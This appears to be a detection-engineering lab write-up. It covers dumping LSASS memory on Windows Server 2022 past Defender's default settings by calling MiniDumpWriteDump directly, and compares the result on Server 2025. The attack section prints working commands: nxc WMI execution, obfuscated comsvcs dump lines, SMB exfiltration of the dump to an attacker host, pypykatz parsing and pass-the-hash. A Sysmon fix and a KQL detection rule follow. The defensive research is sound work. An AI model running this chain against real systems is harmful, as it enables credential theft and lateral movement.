# LSASS Dump via Direct P/Invoke | Defender Bypass (Default configurations) | Detection Engineering

## Overview

Assumed breach scenario. Local admin foothold exists on a domain-joined Windows Server 2022 target with Defender enabled, real-time protection on, behavioral monitoring active, signatures current. No ASR rules configured.

No Mimikatz. No comsvcs. No rundll32. Direct `MiniDumpWriteDump` via P/Invoke from a custom binary delivered over WMI with no output artifacts.

**Result:** 53MB LSASS dump, NT hash, cleartext Kerberos credential, pass-the-hash authentication. Defender did not surface any alert or block for this chain in this configuration.

**Detection:** Single Sysmon EID 10 with anomalous GrantedAccess (`0x1FFFFF`) and `UNKNOWN` CallTrace entry. Three Critical alerts in Kibana — but only after a manual Sysmon config fix that most deployments have not made.

**Core finding:** Defender detects the implementation, not the primitive. This chain works because two complementary detection gaps compound each other — neither alone is sufficient.

---

## Lab Environment

| Host | Role | IP |
|------|------|----|
| Kali | Attacker | 192.168.1.218 |
| WIN-ATTACK | Target (Server 2022) | 192.168.1.83 |
| DC02 | Target (Server 2025) | 192.168.1.5 |
| ELK | SIEM | 192.168.1.250 |

**Server 2022 configuration:**
- Windows Server 2022 Build 20348
- Microsoft Defender — enabled, RTP on, BehaviorMonitorEnabled: True
- Signatures: 1.449.75.0 (updated 4/12/2026)
- ASR rules: none configured
- PPL: not enabled (Server 2022 default)
- Credential Guard: not active (isIso = FALSE)
- Sysmon 15.20 (SwiftOnSecurity base config, modified)
- Winlogbeat 8.19.12 → Elasticsearch 8.19.12

**Server 2025 configuration:**
- Windows Server 2025 Build 26100
- Domain Controller (badsuccessor.local)
- PPL: active (RunAsPPL enabled by default on Server 2025)

---

## Scope and Limitations

This research was conducted primarily on Windows Server 2022 (build 20348), with an additional test against Windows Server 2025 (build 26100). The findings do not automatically translate to hardened configurations where PPL and Credential Guard are active.

**PPL (Protected Process Light)**

On Windows Server 2025 and Windows 11 24H2 with eligible hardware, lsass runs as a Protected Process Light by default. `OpenProcess` with `PROCESS_ALL_ACCESS` (`0x1FFFFF`) may succeed in returning a handle, but subsequent memory read operations are blocked at the kernel level. See the Server 2025 test results below.

**Credential Guard**

On machines with TPM 2.0 + Secure Boot, Credential Guard stores NTLM hashes in `LsaIso.exe` running in VTL1. Even a successful LSASS dump returns encrypted `LSAISO_DATA_BLOB` structures rather than usable credentials. Credential Guard bypass is a separate research track not covered here.

**On Server 2022:**

PPL is not enabled by default on Server 2022 editions. Credential Guard was not active in this lab (`isIso = FALSE`). These conditions represent a realistic enterprise server environment — many production Windows Server deployments do not have these protections explicitly configured.

PPL and Credential Guard close the credential extraction path on hardened endpoints — but they require explicit enablement on Server 2022 and are far from universally deployed. Critically, the EID 10 access attempt fires regardless of whether the dump contains usable credentials. Know which camp your estate is in.

---

## OS Comparison — Server 2022 vs Server 2025

| | Server 2022 (Build 20348) | Server 2025 (Build 26100) |
|---|---|---|
| PPL active | No | Yes |
| Credential Guard | No (isIso = FALSE) | Not verified |
| WMI execution | ✅ Pwn3d! | ✅ Pwn3d! |
| Dump file created | ✅ 53MB | ✅ 0kb |
| Credentials extracted | ✅ NT hash + cleartext | ❌ Nothing to parse |
| OS stability after attempt | ✅ Stable | ❌ DC hung — hard shutdown required |
| Defender alert | ❌ None | ❌ None confirmed* |
| Sysmon EID 10 | ✅ Confirmed | ❌ Not confirmed* |

*DC became unresponsive before log shipping completed. Events may have been buffered but were not received by ELK. No confirmed telemetry from the Server 2025 test.

**What the Server 2025 result tells us:**

WMI execution succeeded — the delivery mechanism works on Server 2025. The dump binary ran. The file was created. But `MiniDumpWriteDump` wrote nothing — PPL blocked the memory read. The subsequent DC instability requiring hard shutdown is consistent with PPL's kernel-level protection mechanisms conflicting with an aggressive memory access attempt against lsass. On a Domain Controller, lsass instability cascades to full OS unavailability.

The DC hang itself is a detectable anomaly — a DC going unresponsive immediately following a WMI execution event is a high-confidence incident signal regardless of whether individual log events were captured.

---

## About the Custom Binary

`getit2.exe` is a simple C# console app targeting .NET Framework 4.8. It uses direct P/Invoke to call `OpenProcess` and `MiniDumpWriteDump` against `dbghelp.dll` — no shellcode, no process hollowing, no reflective loading. The binary was dropped to `C:\Windows\Tasks\` manually as part of an assumed breach scenario representing post-exploitation access.

No obfuscation beyond the placement path and the absence of known tool signatures. The evasion is architectural, not technical — remove the LOLBin, call the API directly, deliver cleanly.

Source code is not published. The point of this research is the detection, not the tool. The key insight is that nothing exotic was required — that is the alarming part.

---

## Why Not comsvcs?

The standard LSASS dump path via LOLBin:

```powershell
$lsapid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsapid C:\Windows\Temp\lsass.dmp full
```

Result on Server 2022 with Defender on:

```
Program 'rundll32.exe' failed to run: Access is denied
```

Defender's behavioral engine blocked `comsvcs.dll + MiniDump + lsass` at the API call level — before the dump executed. No ASR rules were involved. This is default behavioral detection, no special hardening required.

That's the good news. Defender ships meaningful default protection against known tradecraft.

The gap is what comes next.

---

## Failed Attempts — Documenting What Defender Caught

Three comsvcs-based approaches were attempted and blocked before arriving at the working path. Documenting these establishes that Defender's default behavioral detection is functional and isolates exactly where the gap is.

### Attempt 1 — lsassy Module (Obfuscated comsvcs)

The nxc lsassy module was run directly against the target:

```bash
# [Kali]
nxc smb 192.168.1.83 -u administrator -p '<redacted>' -M lsassy --local-auth
```

lsassy attempts to evade detection by obfuscating the comsvcs call:

```
C:\Windows\System32\cmd.exe /C CMd.eXe /Q /c for /f tokens=1,2 delims=  ^%A in
('tasklist /fi Imagename eq lsass.exe | find lsass') do rundll32.exe
C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\TwdU7.tar full
```

Note the evasion attempts:
- Mixed case `CMd.eXe`
- `^` escape characters throughout
- Ordinal reference `#+0000^24` instead of `MiniDump` by name (ordinal 24 = MiniDump export)
- `.tar` extension on the output file instead of `.dmp`

**Result:** Defender caught it. Full command line visible in the alert. The behavioral signature keys on `rundll32 → comsvcs.dll → ordinal 24 → lsass PID` — not on the command line string. String obfuscation is irrelevant when the behavioral pattern is intact.

### Attempt 2 — comsvcs via Encoded PowerShell through Runspace

The comsvcs command was encoded and delivered via the existing CLM bypass binary (getit1.exe), executing inside a trusted .NET runspace context:

```bash
# [Kali] Encode comsvcs payload
COMMAND='$pid = (Get-Process lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full'
ENCODED=$(echo -n "$COMMAND" | iconv -t utf-16le | base64 -w 0)

# [Kali] Deliver via WMI through trusted runspace
nxc smb 192.168.1.83 -u administrator -p '<redacted>' -d WIN-ATTACK \
  --no-output -x "C:\\Windows\\Tasks\\getit1.exe $ENCODED"
```

Verify dump:

```bash
nxc smb 192.168.1.83 -u administrator -p '<redacted>' -d WIN-ATTACK \
  -x "dir C:\\Windows\\Temp\\lsass.dmp"
```

Result: `File Not Found`

The dump never landed. Routing the comsvcs call through a trusted runspace context (which bypasses CLM and AMSI) did not change the outcome. The block is at the behavioral/API level, not at the PowerShell layer.

### Attempt 3 — comsvcs directly from revshell

The comsvcs command was attempted directly from an interactive reverse shell running as Administrator with SeDebugPrivilege enabled and High integrity level confirmed:

```powershell
# [revshell]
$lsapid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsapid C:\Windows\Temp\lsass.dmp full
```

Result:

```
Program 'rundll32.exe' failed to run: Access is denied
NativeCommandFailed
```

SeDebugPrivilege, High integrity, no ASR rules — none of it mattered.

**What the three attempts establish:**

| Attempt | Method | Obfuscation | Result |
|---------|--------|-------------|--------|
| lsassy module | comsvcs via cmd chain | Mixed case, ordinal, .tar extension | Defender alert — full cmdline visible |
| Runspace delivery | comsvcs via trusted .NET runspace | CLM/AMSI bypass | Blocked — file not found |
| Direct revshell | comsvcs direct | None | Blocked — access denied |

The comsvcs block is not a privilege issue, not a CLM issue, not an obfuscation issue, not an ASR issue. It is a default behavioral detection that fires on the invariant pattern: `rundll32 → comsvcs.dll → MiniDump → lsass`. The bad news is that removing those identifiers while keeping the same underlying primitive bypasses the detection entirely.

See the repo for the code (one particular iteration of the obfuscation):

https://github.com/login-securite/lsassy/blob/master/lsassy/dumpmethod/comsvcs_stealth.py

---

## Two Gaps, One Chain

This chain works because two independent detection gaps compound each other. Neither is sufficient alone — together they produce a clean execution path with a single telemetry artifact.

### Gap 1 — nxc `--no-output` (Delivery)

The `--no-output` gap in NetExec is a known behavior in offensive tooling circles. What makes it relevant here is not novelty but context — it is the delivery mechanism that makes Gap 2 matter.

In standard operation, nxc captures command output by writing results to a temp file on the target, reading it back over SMB, then deleting it. That temp file write is a detectable artifact — a signatured pattern that Sysmon and Defender both have opinions about.

The `--no-output` flag removes that mechanism entirely:

- No temp file written to disk
- No output captured or read back
- No SMB read of a results file
- Parent process on target: `WmiPrvSE.exe`
- No cmd.exe spawned
- No PowerShell invoked

The execution disappears into WmiPrvSE. From a telemetry perspective, it looks like a routine WMI operation. This was documented as a detection gap in [Vector 2](../vector2/).

### Gap 2 — Direct P/Invoke (Primitive)

Once on the target, the binary calls `MiniDumpWriteDump` directly via P/Invoke against `dbghelp.dll`. This is the same underlying Windows function that comsvcs.dll uses internally — but because it is called directly from a custom binary rather than through a known LOLBin, Defender has no behavioral pattern to match against.

Defender's block on comsvcs is tied to the known execution chain: `rundll32.exe → comsvcs.dll → MiniDump export → lsass`. Remove any element of that chain and the pattern no longer matches.

The primitive is identical. The wrapper is not. That was enough.

**Why they compound:**

The delivery mechanism (Gap 1) ensures no execution artifact points at the binary. The dump mechanism (Gap 2) ensures no behavioral signature matches the primitive. An attacker using only Gap 1 with comsvcs would be blocked at the dump. An attacker using only Gap 2 with a noisy delivery method would be caught at execution. Together they produce a chain where the only artifact is the EID 10 — and only if Sysmon is correctly configured.

---

## Attack Path

### Phase 1 — Delivery via WMI (No Output)

```bash
# [Kali] Execute dump binary on target
nxc smb 192.168.1.83 -u administrator -p '<redacted>' -d WIN-ATTACK \
  --no-output -x "C:\\Windows\\Tasks\\getit2.exe --dump C:\\Windows\\Temp\\lsass.dmp"
```

> **Note:** Source code not published — see "About the Custom Binary" above.

The chain removes every high-signal heuristic:
- No LOLBins
- No known tooling signatures
- No anomalous parent-child execution chain
- Direct API usage produces low static signal
- No output artifacts from the delivery mechanism

---

### Phase 2 — LSASS Dump via Direct P/Invoke

Same primitive as the blocked comsvcs path. Same access. Same outcome. Different wrapper.

Access mask requested: `0x1FFFFF` (PROCESS_ALL_ACCESS).

```bash
# [Kali] Confirm dump landed
nxc smb 192.168.1.83 -u administrator -p '<redacted>' -d WIN-ATTACK \
  -x "dir C:\\Windows\\Temp\\lsass.dmp"
```

Expected output: `lsass.dmp` ~53MB, timestamp matching execution time.

Defender did not surface any alert or block for this path in this configuration.

---

### Phase 3 — Exfiltration

```bash
# [Kali] Exfil dump over SMB
smbclient //192.168.1.83/C$ \
  -U 'WIN-ATTACK\administrator%<redacted>' \
  -c "get Windows\Temp\lsass.dmp /tmp/lsass.dmp"
```

---

### Phase 4 — Offline Parsing

```bash
# [Kali] Parse with pypykatz — no Mimikatz binary required
pypykatz lsa minidump /tmp/lsass.dmp
```

**Recovered:**
- `Administrator @ DOMAIN` — NT hash
- `Administrator @ DOMAIN` — cleartext password (Kerberos cache)
- `WIN-ATTACK$` — machine account NT hash
- `WIN-ATTACK$` — machine account Kerberos password (Silver Ticket viable)

---

### Phase 5 — Pass-the-Hash

```bash
# [Kali] Authenticate with NT hash — no password required
nxc smb 192.168.1.83 -u administrator -H <redacted> --local-auth
```

Output: `[+] WIN-ATTACK\administrator:<hash> (Pwn3d!)`

---

## Detection

### The Config Gap That Almost Made This Invisible

The SwiftOnSecurity Sysmon base config — widely deployed, widely trusted — ships with:

```xml
<!--SYSMON EVENT ID 10 : INTER-PROCESS ACCESS [ProcessAccess]-->
<!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
<ProcessAccess onmatch="include">
</ProcessAccess>
```

The comment says it all. **An empty include rule logs nothing. No EID 10. No LSASS visibility. Full stop.**

EID 10 was completely silent until the lsass filter was added manually. This is not an edge case — this is the default state of a config that ships as a community standard.

If you are running this config as-is, you have a gap regardless of what endpoint protection you are running.

### Fix

```xml
<ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
</ProcessAccess>
```

Reload:

```powershell
# [WIN-ATTACK]
sysmon64 -c C:\Tools\sysmonconfig-modified.xml
```

---

### Sysmon EID 10 — The Only Artifact

```
EventID:        10
SourceImage:    C:\Windows\Tasks\getit2.exe
TargetImage:    C:\Windows\system32\lsass.exe
GrantedAccess:  0x1FFFFF
CallTrace:      C:\Windows\SYSTEM32\ntdll.dll+9f3b4|
                C:\Windows\SYSTEM32\ntdll.dll+db730|
                C:\Windows\System32\KERNEL32.dll+1e134|
                C:\Windows\System32\KERNEL32.dll+2524e|
                C:\Windows\SYSTEM32\dbgcore.DLL+a47a|
                C:\Windows\SYSTEM32\dbgcore.DLL+19735|
                C:\Windows\SYSTEM32\dbgcore.DLL+12988|
                C:\Windows\SYSTEM32\dbgcore.DLL+66a8|
                C:\Windows\SYSTEM32\dbgcore.DLL+71b8|
                UNKNOWN(00007FF826320D7A)
SourceUser:     WIN-ATTACK\Administrator
TargetUser:     NT AUTHORITY\SYSTEM
```

### Three Indicators

**1. GrantedAccess `0x1FFFFF` (PROCESS_ALL_ACCESS)**

Legitimate system processes accessing lsass use constrained masks:

| Process | GrantedAccess | Purpose |
|---------|---------------|---------|
| svchost.exe | 0x1000 | Query information |
| WmiPrvSE.exe | 0x1400 | Query + read VM |
| MsMpEng.exe (Defender) | 0x1410 | AV scanning |

`0x1FFFFF` against lsass from a non-system binary is a credential theft indicator. There is no legitimate reason for it.

**2. SourceImage outside System32**

All legitimate lsass accessors are system processes. A binary in `C:\Windows\Tasks\` opening lsass with full access has no legitimate justification.

**3. UNKNOWN in CallTrace**

A memory region with no mapped module in the CallTrace is a strong supporting signal for reflectively loaded or unbacked code. It is not conclusive on its own — symbol resolution gaps and certain packed regions can also produce UNKNOWN entries. Combined with indicators 1 and 2, treat as high confidence.

---

### Contrast: What lsassy Looks Like in Telemetry

For comparison, here is what the lsassy module produces when Defender catches it:

```
CmdLine: C:\Windows\System32\cmd.exe /C CMd.eXe /Q /c for /f tokens=1,2 delims=  
^%A in ('tasklist /fi Imagename eq lsass.exe | find lsass') do rundll32.exe 
C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\TwdU7.tar full
```

Every element is visible and attributable — the cmd.exe chain, the rundll32, the comsvcs.dll, the ordinal, the temp file. The obfuscation (`CMd.eXe`, `^` escapes, `.tar` extension, ordinal instead of export name) made no difference. Defender's behavioral engine matched the invariant pattern regardless of string manipulation.

Compare that to the getit2.exe EID 10: no cmd.exe, no rundll32, no comsvcs, no temp file artifact. The entire Defender alert surface is gone.

---

### KQL Detection Rule

```kql
event.code: "10"
and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe"
and winlog.event_data.GrantedAccess: "0x1fffff"
and not winlog.event_data.SourceImage: "C:\\Windows\\system32\\*"
and not winlog.event_data.SourceImage: "C:\\Program Files\\*"
and not winlog.event_data.SourceImage: "C:\\Program Files (x86)\\*"
and not winlog.event_data.SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\*"
```

**Rule properties:**

| Field | Value |
|-------|-------|
| Name | LSASS Access - PROCESS_ALL_ACCESS from Non-System Binary (Sysmon EID 10) |
| Severity | Critical |
| Risk Score | 99 |
| MITRE Tactic | Credential Access (TA0006) |
| MITRE Technique | T1003 - OS Credential Dumping |
| MITRE Sub-technique | T1003.001 - LSASS Memory |
| Tags | credential-access, lsass, defense-evasion, sysmon, T1003, T1003.001 |

**Investigation steps when this fires:**

1. Check `SourceImage` path — binary outside System32/Program Files is anomalous
2. Check `CallTrace` for `UNKNOWN` entries — strong supporting signal for unbacked memory
3. Confirm `GrantedAccess` is `0x1FFFFF` — PROCESS_ALL_ACCESS has no legitimate use case against lsass from a non-system process
4. Correlate with EID 11 (`.dmp` FileCreate) in same time window
5. Correlate with EID 1 (ProcessCreate) for parent process — WmiPrvSE parent indicates remote WMI execution
6. Check for subsequent SMB connections from attacker host (EID 3 NetworkConnect)

---

## What This Means

Defender is not blind. It is pattern-aware. The behavioral block on comsvcs+lsass fires by default — no ASR, no special configuration required. Three separate attempts using comsvcs, including an obfuscated open-source tool implementation, were all caught.

But the pattern is tied to known tradecraft, not the invariant behavior. The API call itself is not malicious — the context is. When you remove the known identifiers (LOLBins, known tool signatures, recognized execution chains), you fall below the behavioral threshold.

The detection boundary is not "credential dumping" — it is "credential dumping as previously observed."

This isn't a bypass. It's a class of behavior.

**Two conditions must both be true for this to be caught:**

1. Sysmon EID 10 must be configured to log lsass access — not the default
2. A rule must key on anomalous GrantedAccess values from non-system binaries

Miss either one and this chain produces no alert.

---

## Complete Attack Chain Summary

```
[Kali] nxc smb --no-output → WmiPrvSE (no cmd.exe, no PS, no output artifacts)
    ↓                         ← Gap 1: known nxc behavior, relevant here as delivery enabler
[WIN-ATTACK] getit2.exe → OpenProcess(lsass, 0x1FFFFF) → MiniDumpWriteDump → lsass.dmp
    ↓                         ← Gap 2: direct P/Invoke, no LOLBin, no behavioral signature
[Kali] smbclient → /tmp/lsass.dmp
    ↓
[Kali] pypykatz → NT hash + cleartext Kerberos credential
    ↓
[Kali] nxc -H <NT_hash> → Pwn3d!

Defender alerts (working chain):  0
Defender alerts (lsassy):         1 — comsvcs caught immediately
ASR rules active:                 0
PPL active (Server 2022):         No
PPL active (Server 2025):         Yes — dump failed, DC hung
Credential Guard (Server 2022):   No (isIso = FALSE)
Sysmon EID 10 (Server 2022):      Confirmed — 0x1FFFFF + UNKNOWN
Sysmon EID 10 (Server 2025):      Not confirmed — DC hung before log shipping
Kibana Critical alerts:           3 (after rule creation)
```

---

## References

- [Sysmon — Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [pypykatz](https://github.com/skelsec/pypykatz)
- [MiniDumpWriteDump — MSDN](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)
- [MITRE T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

---
<img width="1853" height="1051" alt="1kibanaalert" src="https://github.com/user-attachments/assets/9f243106-e6a0-4d34-8e89-d48b50d47f29" />

<img width="1540" height="66" alt="2failurecomvsscommandpayload" src="https://github.com/user-attachments/assets/7b4c7cd5-af62-435b-a8b0-7a5d2734da68" />

<img width="1427" height="383" alt="3failurecomvssredacted" src="https://github.com/user-attachments/assets/7322be27-86d4-4f2f-bf29-1ccb820a5066" />

<img width="1455" height="197" alt="4comsvcsdeniedevenfromevasionshell" src="https://github.com/user-attachments/assets/7c21796b-b902-42d3-9059-0e23e100e2a7" />

<img width="1778" height="87" alt="5dumplsassredacted" src="https://github.com/user-attachments/assets/9cf9d343-281b-40fa-8d7b-c46520ad50c8" />

<img width="1134" height="735" alt="6AVon" src="https://github.com/user-attachments/assets/51c04ce3-a7c4-4b1a-bb64-ce43b121f7ce" />

<img width="1100" height="38" alt="7smbexfilofntdss" src="https://github.com/user-attachments/assets/aeb3aab2-1031-4eac-9d5c-109c4c7ee0e7" />

<img width="1128" height="410" alt="8lsassdump516am" src="https://github.com/user-attachments/assets/edbcb9c1-7bba-4084-a2ed-a05327b30b26" />

<img width="1552" height="749" alt="9pypykatzoutput" src="https://github.com/user-attachments/assets/a75c250c-b52f-4a84-81b5-cbc3553cabf9" />

PTH:
<img width="1632" height="63" alt="10pth" src="https://github.com/user-attachments/assets/f53235a7-2d03-4b15-b2d5-50e59c2c5fb4" />

LSASSY FAIL
<img width="1745" height="104" alt="11LSASSYNXCFAILING" src="https://github.com/user-attachments/assets/efb06510-4e6f-4394-81d3-d2c1e769bd08" />

<img width="1202" height="375" alt="12LSASSYNXCFAILINGavdefender" src="https://github.com/user-attachments/assets/9c708063-fc02-4f38-9371-ad5e022a67de" />

LSASSY FILE NAME EXTENSIONS RANDOMLY FOUND ALONG THE WAY:

<img width="1612" height="525" alt="image" src="https://github.com/user-attachments/assets/a3ce3794-2408-48a0-a0ba-37743aa0154f" />

<img width="526" height="476" alt="apdpoh" src="https://github.com/user-attachments/assets/512e7127-f553-426c-a192-02acfb1bb40a" />


*Lab: Windows Server 2022 Build 20348 | Windows Server 2025 Build 26100 | Sysmon 15.20 | Winlogbeat 8.19.12 | ELK*  
*Author: Osher Jacobs | [GitHub](https://github.com/osherjacobs/AD-Lab-Research) | [LinkedIn](https://linkedin.com/in/osherjacobs)*
